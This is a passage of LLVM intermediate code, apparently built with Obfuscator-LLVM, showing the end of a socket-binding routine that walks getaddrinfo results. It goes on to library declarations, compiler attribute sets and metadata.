  %32 = getelementptr inbounds %struct.addrinfo, %struct.addrinfo* %.01720, i64 0, i32 4
  %33 = load i32, i32* %32, align 8
  %34 = call i32 @bind(i32 %23, %struct.sockaddr* %31, i32 %33) #10
  %35 = icmp eq i32 %34, 0
  br i1 %35, label %43, label %36

; <label>:36:                                     ; preds = %29
  %37 = call i32 @close(i32 %23) #10
  br label %38

; <label>:38:                                     ; preds = %16, %36
  %39 = getelementptr inbounds %struct.addrinfo, %struct.addrinfo* %.01720, i64 0, i32 7
  %.017 = load %struct.addrinfo*, %struct.addrinfo** %39, align 8
  %40 = icmp eq %struct.addrinfo* %.017, null
  br i1 %40, label %._crit_edge.loopexit, label %16

._crit_edge.loopexit:                             ; preds = %38
  br label %._crit_edge

._crit_edge:                                      ; preds = %._crit_edge.loopexit, %.preheader
  %41 = load %struct._IO_FILE*, %struct._IO_FILE** @stderr, align 8
  %42 = call i64 @fwrite(i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.121, i64 0, i64 0), i64 15, i64 1, %struct._IO_FILE* %41) #12
  br label %45

; <label>:43:                                     ; preds = %29
  %44 = load %struct.addrinfo*, %struct.addrinfo** %3, align 8
  call void @freeaddrinfo(%struct.addrinfo* %44) #10
  br label %45

; <label>:45:                                     ; preds = %43, %._crit_edge, %12
  %.018 = phi i32 [ -1, %12 ], [ -1, %._crit_edge ], [ %23, %43 ]
  ret i32 %.018
}

; Function Attrs: noreturn nounwind
declare void @abort() local_unnamed_addr #8

; Function Attrs: nounwind
declare i32 @epoll_create1(i32) local_unnamed_addr #3

declare i32 @getaddrinfo(i8*, i8*, %struct.addrinfo*, %struct.addrinfo**) local_unnamed_addr #1

; Function Attrs: nounwind
declare i8* @gai_strerror(i32) local_unnamed_addr #3

; Function Attrs: nounwind
declare i32 @setsockopt(i32, i32, i32, i8*, i32) local_unnamed_addr #3

; Function Attrs: nounwind
declare void @freeaddrinfo(%struct.addrinfo*) local_unnamed_addr #3

; Function Attrs: nounwind readonly
declare i8* @strchr(i8*, i32) #9

; Function Attrs: nounwind readonly
declare i32 @strncmp(i8* nocapture, i8* nocapture, i64) #9

; Function Attrs: argmemonly nounwind
declare void @llvm.memcpy.p0i8.p0i8.i64(i8* nocapture writeonly, i8* nocapture readonly, i64, i32, i1) #4

; Function Attrs: nounwind
declare i64 @fwrite(i8* nocapture, i64, i64, %struct._IO_FILE* nocapture) #10

attributes #0 = { noinline nounwind uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { nounwind readonly "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { nounwind "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #4 = { argmemonly nounwind }
attributes #5 = { noinline noreturn nounwind uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #6 = { nounwind readnone "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #7 = { noinline norecurse nounwind readonly uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #8 = { noreturn nounwind "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #9 = { nounwind readonly }
attributes #10 = { nounwind }
attributes #11 = { nounwind readnone }
attributes #12 = { cold }
attributes #13 = { noreturn nounwind }

!llvm.ident = !{!0}

!0 = !{!"Obfuscator-LLVM clang version 4.0.1  (based on Obfuscator-LLVM 4.0.1)"}
!1 = !{!2}
!2 = distinct !{!2, !3}
!3 = distinct !{!3, !"LVerDomain"}
!4 = !{!5}
!5 = distinct !{!5, !3}
!6 = distinct !{!6, !7}
!7 = !{!"llvm.loop.unroll.disable"}
!8 = distinct !{!8, !9, !10}
!9 = !{!"llvm.loop.vectorize.width", i32 1}
!10 = !{!"llvm.loop.interleave.count", i32 1}
!11 = distinct !{!11, !9, !10}
!12 = distinct !{!12, !9, !10}
